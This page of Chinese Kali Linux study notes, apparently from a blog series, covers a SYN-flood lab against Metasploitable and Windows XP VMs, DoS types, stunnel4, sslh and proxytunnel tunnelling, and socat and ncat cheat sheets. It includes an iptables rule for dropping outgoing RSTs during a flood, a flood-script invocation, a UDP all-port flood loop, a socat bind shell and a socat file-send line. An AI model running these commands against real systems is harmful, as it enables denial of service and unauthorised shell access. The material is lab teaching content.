Kali Linux笔记(七十九)：Syn-Flood

发表于 2020-02-09 | 分类于 Kali
字数统计: 727 字 | 阅读时长 ≈ 3 分钟

1. Syn-Flood

  • 常伴随IP欺骗
    • 真正的攻击目标
  • Scapy
    • i=IP()
    • i.dst=1.1.1.1
    • i.display()
    • t=TCP()
    • sr1(i/t,verbose=1,timeout=3)
    • sr1(IP(dst=1.1.1.1)/TCP())
  • ▲ 占去服务器最大的TCP连接方式，但不一定占满CPU和内存

2. 实验–准备

  • Kali（攻击者）
    • 网卡方式为Bridge方式，桥接到无线网络，检查网络
  • Metasploit（Linux被攻击者）
    • 网卡方式为Bridge方式，桥接到无线网络，检查网络
  • Window XP SP3（Winodws被轰击者）
    • 网卡方式为Bridge方式，桥接到无线网络，检查网络

3. 实验–Linux

  • Metasploit（Linux被攻击者）
    • 🔺命令：ifconfig查看IP地址
    • 查看开放的端口（TCP端口，🔺命令：netstat -pantu查看）
  • Kali（攻击者）
    • Scapy
      • i=IP()
      • i.dst=”Metasploit的IP”
      • i.display()
      • t=TCP()
      • t.dport=22
      • t.display()（查看发包是否flags=S）
      • sr1(i/t,verbose=1,timeout=3)（查看回包是否flags=SA）
    • ▲ sr1(IP(dst=”Metasploit的IP”)/TCP())
    • 开启Wireshark开启抓包，重新发送数据包（ip add eq Metasploit的IP），RST数据包会让被攻击者丢弃建立的SYN/ACK数据包
    • 🔺命令：iptables -A OUTPUT -p tcp --tcp-flags RST RST -d Metasploit的IP -j DROP
    • 🔺命令：iptables -L进行查看目标是否生效
    • 重新发送数据包（ip add eq Metasploit的IP），看是否出现RST数据包，会出现一个TCP Retransmission重传数据包
    • 先连接🔺命令：ssh msfadmin@Metasploit的IP，尝试连接速度是否延迟
    • 攻击脚本：🔺命令：./syn_flood.py Metasploit的IP 22 200
    • 在攻击的同时开启Wireshark抓包查看数据包，并ssh登陆看是否能登陆
  • Metasploit（Linux被攻击者）
    • 🔺命令：top查看系统性能，重点关注CPU和内存是否提高或者不变
    • 查看TCP连接：🔺命令：netstat -n | awk '/^tcp/ {++S[$NF]} END {for(a in S) print a, S[a]}'

4. 实验–Window

  • Window XP SP3（Winodws被攻击者）
    • 🔺命令：ifconfig查看IP地址
    • 关闭防火墙
    • 开启远程桌面，设置administrator密码（空密码不允许登陆）
  • Kali（攻击者）
    • 🔺命令：rdesktop尝试登陆，连接速度是否延迟
    • 🔺命令：iptables -A OUTPUT -p tcp --tcp-flags RST RST -d Window XP SP3的IP -j DROP
    • 🔺命令：iptables -L进行查看目标是否生效
    • 攻击脚本：🔺命令：./syn_flood.py Window XP SP3的IP 3389 10
    • 在攻击的同时开启Wireshark抓包查看数据包，并rdesktop远程桌面登陆看是否能登陆
  • ▲ Windows系统默认半开连接数10个

1. TCP连接

  • TCP三次握手

  • 根据IP头地址寻址
    • 伪造IP源地址
  • 边界路由过滤器
    • 入站、出站
  • 受害者可能是源、目的地址
  • 绕过基于地址的验证
  • 压力测试模拟多用户
  • 上层协议（TCP序列号）▲ TCP链路劫持
  • ▲ ISP设置出站流量的策略，对伪造源地址出站流量的过滤（边界防火墙）
  • ▲ ISP设置入站流量的策略，对伪造内网地址入站流量的过滤（边界防火墙）

Kali Linux笔记(七十七)：DoS介绍及分类

发表于 2020-02-03 | 分类于 Kali
字数统计: 607 字 | 阅读时长 ≈ 2 分钟

1. 拒绝服务

  • DoS不是DOS
    • 利用程序漏洞少量请求或一对一资源耗尽的Denial of Service拒绝服务
  • DDoS分布式拒绝服务
    • 一对一的攻击完全拼各自的资源，效果差
    • 多对一的攻击汇聚资源能力，重点在于量大，属于资源耗尽型
  • 历史
    • 以前：欠缺技术能力的无赖，我ping死你（最难缠的无赖）
    • 现在：最强大最危险的攻击，攻击方式众多（专业化的要求勒索）
      • 电商网站被勒索，Bill gates僵尸程序
      • 贩卖和租用肉鸡已经称为黑产中重要的一部分
      • 最终的办法就是拼资源，投资抗D，或者乖乖交保护费
  • Anonymous匿名者
    • 世界最著名的黑客组织
    • 组织结构宽松，人员来自世界各地
    • 以DDoS攻击著称的无政府主义者
    • 亦正亦邪，攻击恐怖组织也攻击政府宗教机构
    • 近些年来涉足政治斗争
    • 成员露面时均带有Guy Fawkes面具
    • 最早的核心成员来自4chan图片社区
    • 惯常雇佣外围黑客成员发动DDoS
    • 口号：
      • We are Anonymous,We are a Legion,We do not forgive,We do not forget,
        Expect us.

2. DoS分类

  • D网络
    • 基于巨量的Flood耗尽目标网络带宽资源（打掉服务器的出口带宽）
    • ICMP Flood、UDP Flood
  • D协议
    • 攻击协议漏洞发起的拒绝服务攻击
    • 如Syn Flood、Ping of Death、ARP、DNS、802.11、SSL
    • ▲ Syn → Syn/Ack → ACK（服务器一直等待最后的ACK导致DoS）
    • ▲ ARP（基于传闻的协议，发送即被接受）
  • D应用
    • 针对应用软件和操作系统漏洞发起的拒绝服务攻击
    • 大量频繁访问消耗系统资源严重的应用（CC）
    • 通常表现为操作系统运行正常，网络流量不大，但服务停止响应
    • 可以是一击毙命的，也可以是耗尽目标资源的

3. 为何被DoS

  • 从攻击者到被害者
    • 网络（网络设备等）→ FireWall → 服务器OS → 服务应用
  • 资源耗尽
    • 网络：带宽
    • Firewall：吞吐量、并发连接
    • 服务器：CPU、内存、I/O
    • 应用：处理请求能力、对OS资源的使用权
  • 程序漏洞攻击
    • 缓冲区溢出
    • 协议、程序逻辑漏洞
  • 链路上任何一点都可成为目标

Kali Linux笔记(七十六)：封装TCP流量隧道--stunnel4

发表于 2020-02-03 | 分类于 Kali
字数统计: 569 字 | 阅读时长 ≈ 2 分钟

1. stunnel4

  • 无需修改原代码的情况下将TCP流量封装于SSL通道内
  • 适用于本身不支持加密传输的应用
  • 支持openssl安全特性
  • 跨平台
  • 性能优

2. 实验

  • Mono防火墙
    • 第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查
  • bodhi（stunnel4 Server）
    • 网卡方式为NAT方式，检查网络
  • metasploit（内网的应用服务器，mysql）
    • 网卡方式为Host-only方式，检查网络
  • bodhi（stunnel4 Server）
    • 🔺命令：apt-get install stunnel4
    • 网卡方式修改为Host-only方式，检查网络
    • 浏览器访问mono防火墙
    • 编辑上一个小节的NAT规则
      • Protocol → TCP
      • External port range → from:3306
      • NAT IP → Metasploit的IP地址
      • Local port → 3306
      • 保存更改的应用
    • 编辑上一小节的Rules规则（WAN口）
      • Destination port range → from:other 3306/to:3306
      • 保存更改的应用
  • Kali（stunnel4 Client）
    • 网卡方式为Bridge方式，桥接到无线网络，检查网络
    • 开启Wireshark抓包（ip.address=mono的WAN的IP）
    • 🔺命令：mysql -u root -h mono的WAN的IP
    • 🔺命令：show databases;
    • ▲ Wireshark的TCP Stream可以查看到为明文信息
  • bodhi（stunnel4 Server）
    • 生成证书：🔺命令：openssl req -new –days 365 -nodes -x509 -out /etc/stunnel/ stunnel.pem -keyout /etc/stunnel/stunnel.pem
    • 创建配置文件：/etc/stunnel/stunnel.conf
      • cert = /etc/stunnel/stunnel.pem
      • setuid = stunnel4
      • setgid = stunnel4
      • pid = /var/run/stunnel4/stunnel4.pid
      • [mysqls]
      • accept = 0.0.0.0:443
      • connect = Metasploit的IP:3306
    • stunnel4自动启动
      • /etc/default/stunnel4 → ENABLED=1
    • 启动stunnel4服务端
      • 🔺命令：service stunnel4 start（netstat -pantu进行查看是否开启）
    • 浏览器登陆mono修改WAN的NAT
      • External port range → HTTPS/HTTPS
      • NAT IP → bodhi的IP
      • 保存应用
    • 浏览器登陆mono修改WAN的Rule规则
      • Destination → Address → bodhi的IP
      • Destination port range → HTTPS/HTTPS
      • 保存应用
  • Kali（stunnel4 Client）
    • 创建配置文件：/etc/stunnel/stunnel.conf
      • client = yes
      • [mysqls]
      • accept = 3306
      • connect = mono的IP:443
    • 客户端自动启动
      • /etc/default/stunnel4 → ENABLED=1
    • 启动stunnel4客户端
      • 🔺命令：service stunnel4 stop / start（netstat -pantu进行查看是否开启）
    • 开启Wireshark抓包（ip.address=mono的IP）
    • 🔺命令：mysql -u root -h 127.0.0.1
    • 🔺命令：show databases;
    • ▲ Wireshark的TCP Stream可以查看到为加密信息
  • ▲ 2020.2.3外网WAN访问防火墙WAN的IP，无法进行访问，进行ping防火墙WAN的IP也无法成功，猜测与防火墙规则有关，后面有关stunnel的实验都未作，猜测VMware自带网卡的问题

Kali Linux笔记(七十五)：一端口多服务隧道--sslh

发表于 2020-02-03 | 分类于 Kali
字数统计: 906 字 | 阅读时长 ≈ 3 分钟

1. sslh（ssl+ssh）

  • 端口分配器
    • 根据客户端第一个包检测协议类型
    • 根据协议检测结果将流量转发给不同目标
    • 支持HTTP、HTTPS、SSH、OpenVPN、tinc、XMAPP和可基于正则表达式判断的人和协议类型
    • 适用于防火墙允许443端口入站访问流量的环境

2. 实验

  • Mono防火墙
    • 第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查
  • Kali（SSLH）
    • 网卡方式为Host-only方式，检查网络
  • Window Server 2003（内网的CA服务器）
    • 网卡方式为Host-only方式，检查网络
    • 安装web server
      • Win+R → appwiz.cpl → 更改或添加程序 → 应用程序服务器 → IIS → 万维网服务/Active Server Pages，可能需要光盘）
    • 安装CA服务器
      • Win+R → appwiz.cpl → 更改或添加程序 → 证书服务
      • 独立根CA类型、证书名称：LAB CA、有效期限
    • 开始 → Internet信息服务（IIS）管理器
      • w2k3（本地计算机）→ 网站 → 默认网站 → 右键 → 属性
      • 目录安全性 → 服务器证书 → 名称：www.lab.com、2048位长、单位：IT、部门：IT、公用名称：www.lab.com、国家/省市 → 修改申请文件放置位置
      • 浏览器范围访问http://127.0.0.1/certsrv/ → 申请证书 → 高级证书 → BASE64编码 → 粘贴证书服务器代码 → 提交
    • 开始 → 证书服务器管理
      • LAB CA → 挂起的申请 → 选中申请的证书右键 → 所有任务 → 颁发
      • 证书可以在颁发的证书中查看详细信息
    • 浏览器范围访问http://127.0.0.1/certsrv/ → 查看挂起的证书申请状态 → 下载证书 → 保存在桌面
    • 开始 → Internet信息服务（IIS）管理器
      • w2k3（本地计算机）→ 网站 → 默认网站 → 右键 → 属性
      • 目录安全性 → 服务器证书 → 处理挂起的请求并安装证书
      • w2k3（本地计算机）→ 网站 → 默认网站 → 右键 → 属性
      • 目录安全性 → 查看证书
      • w2k3（本地计算机）→ 网站 → 默认网站 → 右键 → 属性
      • 目录安全性 → 编辑 → 要求安全通道（SSL）
      • 停止网站 → 重新启动
  • Kali（SSLH）
    • 浏览器访问https://Window Server 2003的IP，看是否能通过SSL通道进行通信
    • 配置文件：🔺命令：vi /etc/default/sslh
      • RUN=yes
      • DAEMON=/usr/sbin/sslh
      • DAEMON_OPTS=”–user sslh –listen 本机的IP:443 –ssh 127.0.0.1:22 –http 127.0.0.1:80 –ssl Window Server 2003的IP:443 –pidfile /var/run/sslh/sslh.pid”
    • 启动apache服务，修改侦听端口🔺命令：vi /etc/apache2/ports.conf → 127.0.0.1:80，重启apache服务，🔺命令：netstat -pantu查看是否更改
    • 开启SSH服务（修改SSH配置文件）
  • Mono防火墙
    • 浏览器访问mono防火墙
    • 新建NAT规则
      • Interface → WAN
      • External address → Interface address（若为网段其他的IP映射，需设置为WAN address → Server NAT → 加入整个网段）
      • Protocol → TCP
      • External port range → HTTPS/HTTPS
      • NAT IP → KALI的IP
      • Auto-add a firewall rule to permit traffic through this NAT rule
    • 保存应用，Rules的WAN口多出一条rule
  • Kali（SSLH）
    • 🔺命令：service sslh start（netstat -pantu进行查看）
    • 浏览器验证本机http是否正常进行
  • 物理机
    • 浏览器访问http://防火墙WAN的IP:443 → Kali的Web资源
    • 浏览器访问https://防火墙WAN的IP → Window Server 2003的Web资源
    • ssh尝试登陆防火墙WAN的IP:443进行登陆
  • 🔺命令：namp -p443 -sV -A 防火墙WAN的IP
    • 基本可以扫描出所有的服务
  • ▲ 2020.2.3内网sslh代理正常，原因在于访问Kali IP三种方式都能代理，但外网WAN访问防火墙WAN的IP，无法进行访问，进行ping防火墙WAN的IP也无法成功，猜测与防火墙规则有关

Kali Linux笔记(七十四)：HTTP(S)隧道--proxyptunnel

发表于 2020-02-03 | 分类于 Kali
字数统计: 1.2k 字 | 阅读时长 ≈ 4 分钟

1. proxytunnel

  • 通过标准的HTTP/HTTPS代理创建隧道的工具
  • 通过HTTP CONNECT方法封装信息
  • 适用于内网使用代理并且防火墙只允许代理服务器上网的场景
  • 无法创建DNS隧道和ICMP隧道
  • 侦听端口开在本地上，可以指定需要访问的资源，服务器

2. 实验-1–准备

  • 将外网资源映射为内网指定端口
  • Mono防火墙
    • 第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查
  • bodhi（代理服务器）
    • 网卡方式为Host-only方式，检查网络
  • PC（bodhi克隆）
    • 网卡方式为Host-only方式，检查网络
  • Kali
    • 网卡方式为Bridge方式，桥接到无线网络，检查网络

3. 实验-1

  • bodhi（代理服务器）
    • 浏览器登陆mono防火墙，增加规则只允许HTTP80访问，LAN -> WAN HTTP
    • 暂时开启mono防火墙默认规则，方便下squid3和proxytunnel
    • 🔺命令：sudo apt-get install squid3（默认所有IP监听3128端口）
    • 🔺命令：vi /etc/squid3/squid.conf ▲ 修改侦听IP，防止公网连接
      • /^http_port → 内网IP:3128
      • /^http_access → 修改deny为allow（ports/ssl/all等）
      • /^acl → 查看安全策略
    • 🔺命令：sudo squid3 -k kill（会自动重启）
    • 🔺命令：netstat -pantu | grep 3128（查看是否限制为监听内网的3128端口）
  • PC（bodhi克隆）
    • 🔺命令：sudo apt-get install proxytunnel
  • bodhi（代理服务器）
    • 关闭mono防火墙默认规则
  • PC（bodhi克隆）
    • 在无代理的情况下访问外网资源尝试
    • 设置HTTP proxy → 代理服务器IP:3128，进行访问外网资源尝试
  • Kali
    • 开启Web服务
    • 启动Wireshark抓包
  • PC（bodhi克隆）
    • 访问Kali的Web服务进行尝试
  • Kali
    • 查看抓包的数据分析（TCP Stream → Via/X-Fowarded-For会泄露真实IP以及代理IP）
  • PC（bodhi克隆）
    • 关闭代理端口
    • 🔺命令：proxytunnle -a（监听端口）80 -p 代理服务器IP:3128 -d Kali的IP:80
    • 浏览器访问http:127.0.0.1:80进行尝试

4. 实验-2–准备

  • 外网资源非防火墙允许端口
  • 修改目标资源侦听端口可能无法躲避防火墙深层检测（协议检测可发现非80HTTP流量）
  • 外网安装squid3代理服务器并侦听80端口
  • Mono防火墙
    • 第一个网卡为Hosy-only方式，第二个网卡为Bridge桥接方式，桥接到无线网络，检查
  • bodhi（代理服务器）
    • 网卡方式为Host-only方式，检查网络
  • PC（bodhi克隆）
    • 网卡方式为Host-only方式，检查网络
  • Kali（代理服务器+目标资源）
    • 网卡方式为Bridge方式，桥接到无线网络，检查网络

5. 实验-2

  • bodhi（代理服务器）
    • 浏览器登陆mono防火墙，增加规则只允许HTTP80访问，LAN -> WAN HTTP
    • 暂时开启mono防火墙默认规则，方便下squid3和proxytunnel
    • 🔺命令：sudo apt-get install squid3（默认所有IP监听3128端口）
    • 🔺命令：vi /etc/squid3/squid.conf ▲ 修改侦听IP，防止公网连接
      • /^http_port → 内网IP:3128
      • /^http_access → 修改deny为allow（ports/ssl/all等）

1. SOCAT

  • 侦听端口
    • 🔺命令：socat - tcp4-listen:22 / socat - tcp-l:33
  • 接受文件
    • 🔺命令：socat tcp4-listen:333 open:2.txt,creat,append
  • 发送文件
    • 🔺命令：cat 1.txt | socat - tcp4:1.1.1.1:333
  • 远程shell–服务器端
    • 🔺命令：socat tcp-l:23 exec:sh,pty,stderr
  • 端口转发
    • 🔺命令：socat tcp4-listen:22,fork tcp4:1.1.1.1:22
  • 远程执行命令

    • 客户端：🔺命令："id" | socat - udp4-datagram:1.1.1.1:2001
  • UDP全端口任意内容发包
    • 🔺命令：for PORT in {1..65535}; do echo “aaaaa" | socat - UDP4-DATAGRAM: 1.1.1.1:$PORT; sleep .1; done
  • 二进制编辑器
    • 🔺命令：echo -e "\0\14\0\0\c" | socat -u - file:/usr/bin/ squid.exe,seek,seek=0x00074420
  • 简单的WEB服务

1. NCAT

  • 被称为众多NC衍生版软件中最优的选择
  • 代理功能（如果不指定端口，默认为31337）
    • 🔺命令：ncat -l 8080 --proxy-type http --proxy-auth user:pass
    • 浏览器设置代理服务器127.0.0.1:31337，进行网页访问
  • Broke中介功能
    • AB不同但AC、BC互通
    • 服务器：🔺命令：ncat -l 333 --broke
    • 客户端之间：发送任何信息都会被hub到其他客户端
    • 批量执行命令：🔺命令：ncat 1.1.1.1 --sh-exec "echopwd"
    • 批量传文件：🔺命令：ncat --send-only 1.1.1.1 < inputfile
  • 实验（Kail上的三个终端窗口进行模拟）
    • 1：🔺命令：ncat -l 333 --broke
    • 2/3：🔺命令：ncat localhost 333
    • 2：🔺命令：aaa → 3收得到信息
    • 3：🔺命令：bbb → 2收得到信息
    • 2：🔺命令：ncat 127.0.0.1 333 --sh-exec "echopwd" → 3进行pwd系统指令操作
    • 3：🔺命令：ncat --send-only 127.0.0.1 333 < a.php → 2收到a.php文件

1. DNS协议隧道–iodine

  • 基于DNS查询的隧道工具
  • 与同类工具相比的优点
    • 对下行数据不进行编码，因此性能优
    • 支持多平台：Linux、BSD、Mac OS、Windows
    • 最大16个并发连接
    • 强制密码支持
    • 支持同网段隧道IP（不同于服务器、客户端网段）
    • 支持多种DNS记录类型（自动协商使用的DNS记录类型）
    • 丰富的隧道质量检测措施
